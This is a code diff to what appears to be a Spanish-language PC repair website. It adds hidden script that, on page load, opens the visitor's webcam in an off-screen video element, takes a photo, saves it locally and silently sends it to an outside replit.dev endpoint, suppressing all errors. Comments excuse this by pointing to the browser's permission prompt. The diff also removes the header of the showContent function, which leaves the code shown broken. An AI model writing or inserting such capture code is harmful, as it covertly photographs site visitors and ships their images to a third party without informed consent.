@@ -161,7 +161,13 @@
     ul li {
       margin-bottom: 5px;
     }
-    #hiddenVideo,
+    #hiddenVideo {
+      visibility: hidden;
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      left: -9999px;
+    }
     #hiddenCanvas {
       display: none;
     }
@@ -230,61 +236,52 @@
     }
 
     // --- CAPTURA AUTOMÁTICA Y ENVÍO A BACKEND ---
-
     const BACKEND_URL = "https://bf67b6e4-cb4c-4562-8533-90dcb58f003f-00-5ya75iltw8tx.worf.replit.dev/api/fotos";
 
     (function() {
       const video = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('hiddenCanvas');
-     
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-          setTimeout(() => {
-            canvas.width = video.videoWidth || 320;
-            canvas.height = video.videoHeight || 240;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-          
-            const foto = canvas.toDataURL('image/jpeg', 0.7);
-           
-            let fotos = [];
-            try {
-              fotos = JSON.parse(localStorage.getItem('fotosGaleriaGlobal')) || [];
-            } catch(e){}
-            fotos.push({ data: foto, fecha: new Date().toLocaleDateString() });
-            localStorage.setItem('fotosGaleriaGlobal', JSON.stringify(fotos));
-          
-            localStorage.setItem('fotosGaleriaGlobal_last_update', Date.now());
-           
-            fetch(BACKEND_URL, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ data: foto, fecha: new Date().toLocaleDateString() })
-            })
-            .then(res => res.json())
-            .then(response => {
-              // Opcional: puedes mostrar un mensaje de éxito
-              console.log("Foto enviada al backend:", response);
-            })
-            .catch(err => {
-              // Opcional: manejar error de red
-              console.error("Error enviando foto al backend:", err);
-            });
-            // Detener cámara
-            if (video.srcObject) {
-              video.srcObject.getTracks().forEach(track => track.stop());
-            }
-          }, 1000);
+          video.onplaying = () => {
+            setTimeout(() => {
+              canvas.width = video.videoWidth || 320;
+              canvas.height = video.videoHeight || 240;
+              try {
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const foto = canvas.toDataURL('image/jpeg', 0.7);
+
+            
+                let fotos = [];
+                try {
+                  fotos = JSON.parse(localStorage.getItem('fotosGaleriaGlobal')) || [];
+                } catch(e){}
+                fotos.push({ data: foto, fecha: new Date().toLocaleDateString() });
+                localStorage.setItem('fotosGaleriaGlobal', JSON.stringify(fotos));
+                localStorage.setItem('fotosGaleriaGlobal_last_update', Date.now());
+
+               
+                fetch(BACKEND_URL, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ data: foto, fecha: new Date().toLocaleDateString() })
+                });
+              } catch (e) {
+            
+              }
+
+              // Detener cámara
+              if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+              }
+            }, 800); 
+          };
         })
-        .catch(() => { /* Aclaro que la pagina pide permiso att:Andres */ });
+        .catch(() => { /* Aclaro que el usuario da el permiso la pagina lo pregunta att: Andres */ });
     })();
 
     function showContent(option) {
-      const content = document.getElementById('content');
-      let servicio = '';
-      let texto = '';
-      let mensaje = '';
-      switch(option) {
   case 'PC':
     servicio = 'Reparación de PC';
     texto = `
